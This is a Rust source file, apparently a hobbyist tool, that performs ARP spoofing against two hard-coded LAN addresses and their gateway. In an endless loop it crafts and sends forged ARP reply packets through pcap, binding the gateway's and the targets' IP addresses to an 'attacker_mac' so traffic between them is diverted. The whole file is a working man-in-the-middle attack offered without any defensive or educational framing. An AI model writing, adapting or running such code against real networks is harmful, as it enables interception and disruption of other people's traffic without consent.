use pcap::{Capture, Device};
use std::net::Ipv4Addr;
use macaddr::MacAddr6;
use std::process::Command;
use std::time::Duration;
use std::thread;

fn main() {
    // ipv4 targets
    let targets: Vec<Ipv4Addr> = [Ipv4Addr::new(192,168,50,211), Ipv4Addr::new(192,168,50,24)].to_vec();                    

    // ur gateway
    let gateway_ip: Ipv4Addr = Ipv4Addr::new(192, 168, 50, 1);

    // ur mac
    let attacker_mac: MacAddr6 = MacAddr6::new(0x2c, 0xf0, 0x5d, 0x9d, 0xbe, 0x3a);

    // ur nic's
    let device_list : Vec<Device> = pcap::Device::list().unwrap();

    // my ethernet nic is the 6th element of the device array
    let network_interface: Device = device_list[6].clone();
    
    // print all interface devices
    /*for i in 0..device_list.len() { 
        println!("Device {}: {:?}\n", i, device_list[i]);
    }*/

    let mut count: usize = 0; // packet count

    loop {
        for x in 0..targets.len() {
            let cap: Capture<pcap::Active> = Capture::from_device(network_interface.clone()).unwrap()
                    .immediate_mode(true)
                    .open().unwrap();
    
            let packet: Arp = Arp::new(gateway_ip, targets[x], attacker_mac);
            let arp_packet: () = packet.send_arp(cap);
            
            thread::spawn(move || {
                arp_packet.clone()
            });

            println!("Target: {} -- Gateway: {}", targets[x], gateway_ip);
            thread::sleep(Duration::from_millis(10)); // delay between each target
        }
        count += targets.len();
        println!("Total Packets: {}", count);
        thread::sleep(Duration::from_millis(100));
        let _: std::process::ExitStatus = Command::new("cmd.exe").arg("/C").arg("cls").status().unwrap();
    }
    
}


struct Arp {
    gateway_ip: Ipv4Addr,
    target_ip: Ipv4Addr,
    attacker_mac: MacAddr6,
}

impl Arp {
    fn new(gateway_ip: Ipv4Addr, target_ip: Ipv4Addr, attacker_mac: MacAddr6) -> Self {
        Arp {
            gateway_ip: gateway_ip,
            target_ip: target_ip,
            attacker_mac: attacker_mac,
        }
    }

    fn send_arp(self, mut cap: Capture<pcap::Active>) -> () {
        // send target arp
        let arp_target: Vec<u8> = Arp::arp_packet(self.gateway_ip, self.target_ip, self.attacker_mac);
        cap.sendpacket(arp_target).unwrap();
    
        // send gateway arp
        let arp_gateway: Vec<u8> = Arp::arp_packet(self.target_ip, self.gateway_ip, self.attacker_mac);
        cap.sendpacket(arp_gateway).unwrap();
    
    }

    // literally just got from wireshark
    fn arp_packet(src_ip: Ipv4Addr, dst_ip: Ipv4Addr, src_mac: MacAddr6) -> Vec<u8> {
        let mut packet: Vec<u8> = Vec::with_capacity(42); // packet size (42 bytes -- 336 bits)
    
        // eth header
        packet.extend_from_slice(&[0xff, 0xff, 0xff, 0xff, 0xff, 0xff]); // dest mac
        packet.extend_from_slice(&src_mac.as_bytes()); // src mac
        packet.extend_from_slice(&[0x08, 0x06]); // type (0x0806)
    
        // arp header
        packet.extend_from_slice(&[0x00, 0x01]); // hw type (eth)
        packet.extend_from_slice(&[0x08, 0x00]); // prot type (ipv4)
        packet.extend_from_slice(&[0x06]); // hw size
        packet.extend_from_slice(&[0x04]); // prot size
        packet.extend_from_slice(&[0x00, 0x02]); // opcode
        packet.extend_from_slice(&src_mac.as_bytes()); // sender mac address
        packet.extend_from_slice(&src_ip.octets()); // sender ip address
        packet.extend_from_slice(&[0xff, 0xff, 0xff, 0xff, 0xff, 0xff]); // target mac address
        packet.extend_from_slice(&dst_ip.octets()); // target ip address
    
        return packet;
    }
}